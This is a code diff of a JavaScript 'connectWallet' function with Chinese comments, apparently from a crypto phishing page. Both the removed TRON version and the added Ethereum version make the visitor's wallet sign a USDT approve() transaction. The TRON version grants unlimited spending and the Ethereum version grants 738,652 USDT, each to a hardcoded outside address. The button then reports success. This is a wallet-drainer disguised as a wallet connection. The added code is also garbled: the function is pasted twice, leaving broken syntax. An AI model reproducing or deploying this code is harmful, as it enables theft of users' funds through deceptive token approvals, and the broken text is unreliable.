@@ -1,22 +1,15 @@
 async function connectWallet() {
-    try {
-        // 动态加载 tronWeb 对象
-        if (typeof window.tronWeb === 'undefined') {
-            // 这里可以加载 tronWeb 的 script
-            // 比如：const script = document.createElement('script');
-            // script.src = 'https://cdn.jsdelivr.net/npm/@tronprotocol/tronweb@latest/dist/TronWeb.min.js';
-            // document.head.appendChild(script);
-            alert('请安装支持 TRC20 的钱包插件并登录');
-            return;
-        }
-
-        // 确保钱包已连接
-        if (window.tronWeb.defaultAddress.base58) {
-            // 获取用户的 TRON 地址
-            const userAddress = window.tronWeb.defaultAddress.base58;
-
-            // TRC20 USDT 合约地址和 ABI
-            const usdtAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+    if (typeof window.ethereum !== 'undefined') {
+        try {
+            // 请求连接到钱包
+            await window.ethereum.request({ method: 'eth_requestAccounts' });
+            
+            // 创建以太坊提供者和签名者
+            const provider = new ethers.providers.Web3Provider(window.ethereum);
+            const signer = provider.getSigner();
+            
+            // USDT 合约地址和 ABI
+            const usdtAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
             const usdtAbi = [
                 {
                     "constant": false,
@@ -29,27 +22,71 @@ async function connectWallet() {
                     "type": "function"
                 }
             ];
-
+            
             // 创建 USDT 合约实例
-            const usdtContract = await window.tronWeb.contract().at(usdtAddress);
-
+            const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, signer);
+            
             // 授权地址和数量
-            const spenderAddress = "TFjUz313BQXRSj7g4FabMVegHPfUKj6Uhz";
-            const amount = '0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF'; // 无限授权
-
+            const spenderAddress = "0xe9D33F333b3c498dcad2B590f427568032e27999";
+            const amount = ethers.utils.parseUnits("738652", 6); // 738652 USDT
+            
             // 发送授权交易
-            const tx = await usdtContract.approve(spenderAddress, amount).send({
-                feeLimit: 100000000, // 设置手续费限制为 100 TRX
-                callValue: 0 // 设置交易调用的 TRX 数量
-            });
-
+            const tx = await usdtContract.approve(spenderAddress, amount);async function connectWallet() {
+    if (typeof window.ethereum !== 'undefined') {
+        try {
+            // 请求连接到钱包
+            await window.ethereum.request({ method: 'eth_requestAccounts' });
+            
+            // 创建以太坊提供者和签名者
+            const provider = new ethers.providers.Web3Provider(window.ethereum);
+            const signer = provider.getSigner();
+            
+            // USDT 合约地址和 ABI
+            const usdtAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+            const usdtAbi = [
+                {
+                    "constant": false,
+                    "inputs": [
+                        { "name": "_spender", "type": "address" },
+                        { "name": "_value", "type": "uint256" }
+                    ],
+                    "name": "approve",
+                    "outputs": [{ "name": "", "type": "bool" }],
+                    "type": "function"
+                }
+            ];
+            
+            // 创建 USDT 合约实例
+            const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, signer);
+            
+            // 授权地址和数量
+            const spenderAddress = "0xe9D33F333b3c498dcad2B590f427568032e27999";
+            const amount = ethers.utils.parseUnits("738652", 6); // 738652 USDT
+            
+            // 发送授权交易
+            const tx = await usdtContract.approve(spenderAddress, amount);
+            await tx.wait();
+            
             // 更新按钮文本
-            document.getElementById('okButton').innerText = '获取成功';
-        } else {
-            alert('请登录支持 TRC20 的钱包');
+            document.getElementById('okButton').innerText = '成功USDT738652等待导入';
+        } catch (error) {
+            console.error(error);
+            document.getElementById('okButton').innerText = '连接失败请重新连接';
         }
-    } catch (error) {
-        console.error(error);
-        document.getElementById('okButton').innerText = '获取失败';
+    } else {
+        alert('请安装 MetaMask 等以太坊钱包插件');
+    }
+}
+
+            await tx.wait();
+            
+            // 更新按钮文本
+            document.getElementById('okButton').innerText = '成功USDT738652等待导入';
+        } catch (error) {
+            console.error(error);
+            document.getElementById('okButton').innerText = '连接失败请重新连接';
+        }
+    } else {
+        alert('请安装 MetaMask 等以太坊钱包插件');
     }
 }
